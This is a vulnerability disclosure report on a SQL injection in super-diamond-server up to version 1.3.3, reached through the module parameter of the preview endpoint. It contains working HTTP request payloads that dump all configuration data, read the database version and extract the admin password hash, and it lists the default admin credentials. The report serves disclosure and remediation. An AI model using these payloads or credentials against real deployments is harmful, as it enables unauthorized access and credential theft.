# Super-Diamond SQL Injection Vulnerability Report 

## Introduction to Vulnerabilities

The front-end interface `/superdiamond/preview/{projectCode}/{module}/{type}` of super-diamond-server <= 1.3.3 is vulnerable to SQL injection. The `module` parameter is directly concatenated into the SQL `IN` clause through `StringUtils.split()` and string concatenation without being parameterized and bound. The built-in `SqlInjectionUtil` employs regular expression blacklist filtering, yet this code path does not invoke it at all. Attackers can execute stacked SQL statements with a valid login session.

---

## Affected Versions

super-diamond-server <= 1.3.3

## Utilize conditions

- The target is accessible at `/superdiamond/preview/{projectCode}/{module}/{type}`
- Requires a valid login session (default admin credentials: admin/000000)

---

## Vulnerability Reproduction

Log in to the backend with arbitrary user permissions to obtain cookies

**OR 1=1 bypass to retrieve all configurations**

```
GET /superdiamond/preview/DEMO/%27)%20OR%201=1--/production HTTP/1.1
Host: 127.0.0.1:8090
Cookie: JSESSIONID=cgrth15xu9s91ley5v850pi4m
```

The server returns all configuration data, proving the SQL injection exists.

![image-20260804224615152](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260804224615152.png)

** Extract database version**

```
GET /superdiamond/preview/DEMO/%27)%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(SELECT%20H2VERSION())b%20JOIN%20(SELECT%203)c%20JOIN%20(SELECT%204)d--/production HTTP/1.1
Host: 127.0.0.1:8090
Cookie: JSESSIONID=cgrth15xu9s91ley5v850pi4m
```

Response: `1.4.200`

![image-20260804224732187](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260804224732187.png)

**Extract admin password hash**

```
GET /superdiamond/preview/DEMO/%27)%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(SELECT%20PASSWORD%20FROM%20CONF_USER%20WHERE%20ID=1)b%20JOIN%20(SELECT%203)c%20JOIN%20(SELECT%204)d--/production HTTP/1.1
Host: 127.0.0.1:8090
Cookie: JSESSIONID=cgrth15xu9s91ley5v850pi4m
```

Response: `670b14728ad9902aecba32e22fa4f6bd` (MD5 unsalted)

![image-20260804224710290](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260804224710290.png)

In `ConfigDaoImpl.java`, user parameters are injected into the SQL IN clause via string concatenation:

![image-20260804225055550](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260804225055550.png)
